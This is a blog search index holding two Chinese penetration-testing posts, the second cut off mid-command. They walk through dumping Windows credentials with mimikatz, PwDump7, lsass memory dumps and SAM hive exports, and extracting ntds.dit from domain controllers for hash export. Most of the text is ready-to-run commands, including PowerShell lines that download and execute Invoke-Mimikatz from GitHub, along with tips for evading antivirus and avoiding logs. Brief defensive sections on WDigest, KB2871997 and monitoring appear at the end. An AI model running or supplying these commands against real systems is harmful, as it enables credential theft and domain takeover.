<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>获取windows密码</title>
      <link href="/2022/11/15/passcat/"/>
      <url>/2022/11/15/passcat/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>Windows 系统一般使用两种方法对用户的密码进行加密处理，在域环境中，用户的密码信息以哈希值的密文形式存储在 ntds.dit 二进制文件中，该文件位于 %SystemRoot%\ntds\ntds.dit 路径下，由于该文件一直被活动目录访问，因此这个文件是被系统禁止读取的。</p><p>要想在windows操作系统中抓取散列值或者明文密码，必须将提权提升到SYSTEM。本地用户名、散列值和其他安全验证的信息都保存在<strong>SAM</strong>文件中。<strong>lsass.exe</strong>进程用于实现windows的安全策（本地安全策略和登录策略）。可以使用工具将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。</p><h3 id="0x01-GetPass">0x01 GetPass</h3><p>GetPass 下载地址：<a href="https://bbs.pediy.com/thread-163383.htm">https://bbs.pediy.com/thread-163383.htm</a></p><p>以管理员权限直接运行 GetPassword.exe 直接查看到明文密码</p><img src="/2022/11/15/passcat/image-20221115040043144.png" alt="image-20221115040043144" style="zoom:50%;"><h3 id="0x02-PwDump7">0x02 PwDump7</h3><p>PwDump7 下载地址：<a href="https://www.tarasco.org/security/pwdump_7/">https://www.tarasco.org/security/pwdump_7/</a></p><p>PwDump7 只能获取到用户的 hash，不能看到明文密码，不过可以使用这个 hash 值去 cmd5 等平台查找明文或者直接用哈希传递。</p><p>PwDump7 同样使用管理员权限直接运行即可</p><img src="/2022/11/15/passcat/image-20221115042313237.png" alt="image-20221115042313237" style="zoom:50%;"><h3 id="0x03-QuarkPwDump">0x03 QuarkPwDump</h3><p>QuarkPwDump 下载地址：<a href="https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe">https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-local</span><br></pre></td></tr></table></figure><img src="/2022/11/15/passcat/image-20221115042554042.png" alt="image-20221115042554042" style="zoom:50%;"><h3 id="0x04-Get-PassHashes">0x04 Get-PassHashes</h3><p>Get-PassHashes 是一个 PS 脚本，Get-PassHashes 下载地址：<a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p><p>导入 ps1 脚本，以管理员权限执行 Get-PassHashes 即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-PassHashes.ps1</span><br><span class="line">Get-PassHashes</span><br></pre></td></tr></table></figure><p>或者绕过无法执行 PS 脚本的限制，直接无文件执行（推荐），同样需要管理员权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 不使用代理</span><br><span class="line">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;);Get-PassHashes&quot;</span><br><span class="line"></span><br><span class="line"># 使用代理，如果目标无法访问 github 可以使用下面的命令利用代理访问</span><br><span class="line">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://ghproxy.com/raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;);Get-PassHashes&quot;</span><br></pre></td></tr></table></figure><img src="/2022/11/15/passcat/image-20221115043151916.png" alt="image-20221115043151916" style="zoom:50%;"><h3 id="0x05-mimikatz">0x05 mimikatz</h3><p>mimikatz 是法国技术大神 Benjamin Delpy 使用 C 语言写的一款轻量级系统调试工具，该工具可以从内存中提取明文密码、散列值、PIN 和 K8S 票据，还可以执行哈希传递、票据传递、构建黄金票据等。</p><p>mimikatz 项目 releases 地址：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p>使用 mimikatz 读取本地 SAM 文件，获取 NTLM Hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;</span><br></pre></td></tr></table></figure><img src="/2022/11/15/passcat/image-20221115043516299.png" alt="image-20221115043516299" style="zoom:50%;"><p>或者使用 mimikatz 直接查看明文密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure><img src="/2022/11/15/passcat/image-20221115043720193.png" alt="image-20221115043720193" style="zoom:50%;"><p>另外也可以采用 PowerShell 远程加载 mimikatz，相较于直接拷贝 mimikatz.exe 到目标主机，这种方式隐藏性要更好些。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 不使用代理</span><br><span class="line">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz&quot;</span><br><span class="line"></span><br><span class="line"># 使用代理，如果目标无法访问 github 可以使用下面的命令利用代理访问</span><br><span class="line">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://ghproxy.com/raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz&quot;</span><br></pre></td></tr></table></figure><h3 id="0x06-SAM、SYSTEM、SECURITY-文件">0x06 SAM、SYSTEM、SECURITY 文件</h3><h4 id="导出文件">导出文件</h4><p>直接注册表导出 SAM、SYSTEM、SECURITY 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SAM sam.hive</span><br><span class="line">reg save HKLM\SYSTEM system.hive</span><br><span class="line">reg save HKLM\SECURITY security.hive</span><br></pre></td></tr></table></figure><p>或者使用 ninjacopy 脚本，下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module -name .\Invoke-NinjaCopy.ps1</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination &quot;c:\sam.hiv&quot;</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination &quot;c:\system.hiv&quot;</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SECURITY&quot; -LocalDestination &quot;c:\security.hiv&quot;</span><br></pre></td></tr></table></figure><p>如果条件允许也可以使用 U 盘启动盘直接拷贝以下文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\config\SAM</span><br><span class="line">C:\Windows\System32\config\SYSTEM</span><br><span class="line">C:\Windows\System32\config\SECURITY</span><br></pre></td></tr></table></figure><h4 id="获取-HASH">获取 HASH</h4><p>用 mimikatz 获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit</span><br></pre></td></tr></table></figure><img src="/2022/11/15/passcat/image-20221115044745515.png" alt="image-20221115044745515" style="zoom:50%;"><p>用 cain 获取，找到 Cracker 里的 LM &amp; NTLM Hash，点击加号，选择从 SAM 导入，选择 SAM 文件后，查看 SYSTEM 文件的 HEX，复制到 Boot Key 里，点击下一步即可查看。</p><img src="/2022/11/15/passcat/image-20221115052845813.png" alt="image-20221115052845813" style="zoom:50%;"><p>cain 还可以直接查看明文密码，在 Decoders 里找到 LSA Secrets，导入 system.hiv 和 security.hiv 就可以看到明文的密码了。</p><img src="/2022/11/15/passcat/image-20221115053202056.png" alt="image-20221115053202056" style="zoom:50%;"><h3 id="0x07-lsass-dmp-文件">0x07 lsass.dmp 文件</h3><h4 id="导出文件-2">导出文件</h4><p>任务管理器导出 lsass.dmp 文件，在任务管理器中找到 lsass.exe 右击选择创建转储文件即可。</p><p>或者使用 Procdump 导出 lsass.dmp 文件，Procdump 是微软官方发布的工具，因此基本不会被杀软拦截，下载地址：<a href="https://download.sysinternals.com/files/Procdump.zip">https://download.sysinternals.com/files/Procdump.zip</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.DMP</span><br></pre></td></tr></table></figure><img src="/2022/11/15/passcat/image-20221115054516516.png" alt="image-20221115054516516" style="zoom:50%;"><h4 id="获取-HASH-2">获取 HASH</h4><p>使用 mimikatz 可获取 lsass.dmp 文件里的 hash 以及明文密码值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::minidump lsass.DMP</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><img src="/2022/11/15/passcat/image-20221115055240158.png" alt="image-20221115055240158" style="zoom:50%;"><img src="/2022/11/15/passcat/image-20221115055330333.png" alt="image-20221115055330333" style="zoom:50%;"><h3 id="0x08-ntds-dit">0x08 ntds.dit</h3><p>这部分参考我之前写过的博客：ntds.dit 的提取与散列值导出。已经写的很详细了</p><h3 id="0x09-WIFI-密码">0x09 WIFI 密码</h3><p>使用自带命令可直接查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取登录过的 WIFI 名称</span><br><span class="line">netsh wlan show profiles</span><br><span class="line"></span><br><span class="line"># 获取某个连接过的 WIFI 密码</span><br><span class="line">netsh wlan show profile name=&quot;901&quot; key=clear</span><br><span class="line"></span><br><span class="line"># 获取所有连接过的 WIFI 密码</span><br><span class="line">for /f  &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure><img src="/2022/11/15/passcat/image-20221115060003062.png" alt="image-20221115060003062" style="zoom:50%;"><h3 id="0x10-密码抓取的防范方式">0x10 密码抓取的防范方式</h3><p>1、微软为了防止用户密码在内存中以明文的形式泄漏，发布了布丁KB2871997，关闭了Wdigest功能。</p><p>Windows server 2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。</p><p>Windows server 2012以下版本，如果安装了KB2871997，攻击者同样无法获取明文密码。</p><blockquote><p>KB2871997补丁是微软为了解决PsExec远程查看（c$）问题的补丁，能使本地账号不再被允许远程接入计算机系统，但是系统默认的本地管理员账号administrator这个SID为500的用户例外——即使将Administrator改名，该账号的SID还是500，攻击者仍然可以使用横向攻击方法获得内网中其他机器的控制权。安装28711997后，仍需要禁用默认的Administrator账号，以防御哈希传递攻击</p></blockquote><p>2、在日常的网络维护中，通过查看注册表项Wdigest,可以判断Wdigest功能的状态。如果该项的值为1，用户下次登录时，攻击者就能使用工具获取明文密码。应确保该项的值为0，使用户的明文密码不会出现在内存中。</p><p>命令行环境中开启或关闭Wdigest Auth，有如下两种方法。</p><p>1）reg add 命令</p><p>开启Wdigest Auth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><p>关闭Wdigest Auth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p>（2）使用powershell</p><p>开启Wdigest Auth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure><p>关闭Wdigest Auth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure><p>3、设置Active Directory 2012 R2功能级别</p><p>win server 2012 R2新增了一个“受保护的用户”的用户组（Protected Users），只要将需要保护的用户加入该组，攻击者就无法通过mimikatz等工具抓取明文密码和散列值了</p><p>4、防御mimikatz攻击</p><p>根据Debug权限确定哪些用户可以将调试器附加到任何进程或内核中。在默认情况下，此权限为本地管理员Administrator所有，除了老系统，本地管理员几乎不需要使用此权限。</p><p>mimikatz在抓取散列值或明文密码时需要使用Debug权限(因为mimikatz需要和lsass.exe进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程)。因此，我们可以针对这一点采取进行防御措施。将拥有Debug权限的本地管理员从Administrators组中移除。重启系统后将无法再使用mimikatz进行抓取散列值和明文密码了。</p><img src="/2022/11/15/passcat/image-20221115064445256.png" alt="image-20221115064445256" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码抓取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ntds.dit 的提取与散列值导出</title>
      <link href="/2022/11/14/dcsecurity/"/>
      <url>/2022/11/14/dcsecurity/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>在通常情况下，即使拥有管理员权限，也无法读取域控制器中的C:\Windows\NTDS\ntds.dit文件（活动目录始终访问这个文件，所以文件被禁止读取）。使用Windows本地卷影拷贝服务，就可以获得这个文件的副本</p><p>在活动目录中，所有的数据都保存在ntds.dit文件中。ntds.dit是一个二进制文件，存储位置为域控制器的%SystemRoot%\ntds\ntds.dit。</p><p>ntds.dit中包含（但不限于）用户名、散列值、组、GPP、OU等与活动目录相关的信息。它和SAM文件一样，是被Windows操作系统锁定的。</p><h3 id="0x01-提取ntds-dit">0x01 提取ntds.dit</h3><h4 id="ntdsutil">ntdsutil</h4><p>ntdsutil 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutil 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPromo.exe）成功降级的与控制器留下的元数据等。</p><blockquote><p>Ntdsutil.exe支持的操作系统有windows server2003、windows server2008、windows server2012</p></blockquote><p>该工具默认安装在域控上，使用以下命令创建一个快照，该快照包含 Windows 中的所有文件，且在复制文件时不会受到 Windows 锁定机制的限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114012706884.png" alt="image-20221114012706884" style="zoom:50%;"><p>加载刚刚创建的快照</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;f7c5aed3-4c76-4e53-8b4a-86614dafff9a&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114013138260.png" alt="image-20221114013138260" style="zoom:50%;"><p>使用 copy 命令将快照中的文件复制到 C 盘下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202211140125_VOLUMEC$\windows\NTDS\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure><p>删除之前加载的快照</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;&#123;f7c5aed3-4c76-4e53-8b4a-86614dafff9a&#125;&quot; &quot;delete &#123;f7c5aed3-4c76-4e53-8b4a-86614dafff9a&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114013505396.png" alt="image-20221114013505396" style="zoom:50%;"><p>查询当前系统中的快照，可以看到没有任何快照</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114013601918.png" alt="image-20221114013601918" style="zoom:50%;"><h4 id="vssadmin">vssadmin</h4><p>vssadmin 可用于创建和删除卷影拷贝、列出卷影的信息（只能管理系统 Provider 创建的卷影拷贝）、显示已安装的所有卷影拷贝写入程序（writers）和提供程序（providers），以及改变卷影拷贝的存储空间（即所谓的 “diff 空间”）的大小等。</p><p>vssadmin 的使用流程和 ntdsutil 差不多，首先创建一个 C 盘的卷影拷贝</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=C:</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114014031367.png" alt="image-20221114014031367" style="zoom:50%;"><p>在创建的卷影拷贝中将 ntds.dit 复制出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure><p>删除快照</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=C: /quiet</span><br></pre></td></tr></table></figure><h4 id="vssown-vbs">vssown.vbs</h4><p>vssown.vbs 脚本的功能和 vssadmin 类似，可用于创建和删除卷影拷贝以及启动和停止卷影拷贝服务。</p><p>vssown.vbs 下载地址：<a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p><p>启动卷影拷贝服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /start</span><br></pre></td></tr></table></figure><p>创建一个 C 盘的卷影拷贝</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /create c</span><br></pre></td></tr></table></figure><p>列出当前卷影拷贝</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /list</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114015016370.png" alt="image-20221114015016370" style="zoom:50%;"><p>复制 ntds.dit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure><p>删除卷影拷贝</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /delete &#123;7981F93F-7057-4536-8A43-AEEE1DB22466&#125;</span><br></pre></td></tr></table></figure><h4 id="ntdsutil的IFM">ntdsutil的IFM</h4><p>除了上面介绍的通过执行命令来提取 ntds.dit，也可以通过创建一个 IFM 的方式获取 ntds.dit</p><p>在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p><p>在域控中以管理员模式打开命令行环境，输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114015517917.png" alt="image-20221114015517917" style="zoom:50%;"><p>此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在 C:\test\registry 文件夹下</p><p>将 ntds.dit 拖回本地后，在目标机器上将 test 文件夹删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir /s/q C:\test</span><br></pre></td></tr></table></figure><h4 id="Copy-VSS-ps1">Copy-VSS.ps1</h4><p>nishang 工具包里的 Copy-VSS.ps1 也可以将 ntds.dit 提取出来，nishang 工具包地址：<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Copy-VSS.ps1</span><br><span class="line">Copy-vss</span><br><span class="line">或者</span><br><span class="line">PowerShell -Exec bypass -C &quot;Import-module .\Copy-VSS.ps1;Copy-vss&quot;</span><br></pre></td></tr></table></figure><p>通过该脚本，可以将 SAM、SYSTEM，ntds.dit 复制到与 ps1 脚本相同的目录下。</p><img src="/2022/11/14/dcsecurity/image-20221114021855801.png" alt="image-20221114021855801" style="zoom:50%;"><h4 id="diskshadow">diskshadow</h4><p>diskshadow 和 vshadow 功能类似，不过 vshadow 是包含在 Windows SDK 里的，因此实际应用的时候还需要将其上传到目标机器上。</p><blockquote><p>diskshadow 有交互模式和非交互模式，在使用交互模式时，需要在图形化界面里操作</p></blockquote><p>首先创建一个 txt 文件，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">create</span><br><span class="line">expose %someAlias% k:</span><br><span class="line">exec &quot;C:\windows\system32\cmd.exe&quot; /c copy k:\Windows\NTDS\ntds.dit C:\ntds.dit</span><br><span class="line">delete shadows all</span><br><span class="line">list shadows all</span><br><span class="line">reset</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>使用 diskshadow 直接加载刚才的文本文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diskshadow /s C:\command.txt</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114022815458.png" alt="image-20221114022815458" style="zoom:50%;"><p>因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system c:\windows\temp\system.hive</span><br></pre></td></tr></table></figure><h4 id="Invoke-NinjaCopy-ps1">Invoke-NinjaCopy.ps1</h4><p>PowerSploit 工具包里的 Invoke-NinjaCopy.ps1 脚本也可以提取 ntds.dit 文件，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p><p>PowerSploit 工具包项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-NinjaCopy.ps1</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;</span><br></pre></td></tr></table></figure><h4 id="impacket">impacket</h4><p>impacket 安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">cd impacket</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><p>通过 impacket  里的 <a href="http://secretsdump.py">secretsdump.py</a> 脚本可以直接远程读取 ntds.dit 并导出哈希值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ./build/scripts-3.9</span><br><span class="line">python3 secretsdump.py test.com/administrator:abc@123@10.1.1.2 -outputfile output_ntds</span><br></pre></td></tr></table></figure><h4 id="监控卷影拷贝服务的使用情况">监控卷影拷贝服务的使用情况</h4><p>通过监控卷影拷贝服务的使用情况，可以及时发现攻击者在系统中进行的一些恶意操作。</p><ul><li>监控卷影拷贝服务及任何涉及活动目录数据库文件（ntds.dit）的可疑操作行为</li><li>监控System Event ID 7036（卷影拷贝服务进入运行状态的标志）的可疑实例，以及创建vssvc.exe进程的事件</li><li>监控创建disk shadow.exe及相关子进程的事件</li><li>监控客户端设备中的disk shadow.exe实例创建事件。除非业务需要，在Windows操作系统中不应该出现diskshadow.exe。如果发现，应立即将其删除</li><li>通过日志监控新出现的逻辑驱动器映射事件</li></ul><h3 id="0x02导出ntds-dit中的散列值">0x02导出ntds.dit中的散列值</h3><h4 id="esedbexport">esedbexport</h4><p>安装 esedbexport，以 Kali 为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get install autoconf automake autopoint libtool pkg-config</span><br><span class="line">wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb-experimental-20210424.tar.gz</span><br><span class="line">tar zxvf libesedb-experimental-20210424.tar.gz</span><br><span class="line">cd libesedb-20210424</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">ldconfig</span><br></pre></td></tr></table></figure><p>导出 ntds.dit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure><p>安装 ntdsxtract</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/csababarta/ntdsxtract.git</span><br><span class="line">cd ntdsxtract</span><br><span class="line">python setup.py build</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 all_user.txt 里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee all_user.txt</span><br></pre></td></tr></table></figure><blockquote><p>如果提示 ImportError: No module named Crypto.Hash，直接 pip install pycryptodome 即可</p></blockquote><img src="/2022/11/14/dcsecurity/image-20221114062232506.png" alt="image-20221114062232506" style="zoom:50%;"><p>ntds.dit 包含域内的所有信息，可以通过分析 ntds.dit 导出域内的计算机信息以及其他信息，最后结果将保存在 all_computers.csv 文件内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 dscomputers.py ntds.dit.export/datatable.4 computer_output --csvoutfile all_computers.csv</span><br></pre></td></tr></table></figure><h4 id="impacket-2">impacket</h4><p>将 ntds.dit 和 SYSTEM 文件放入到 impacket 工具的文件夹中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -system SYSTEM -ntds 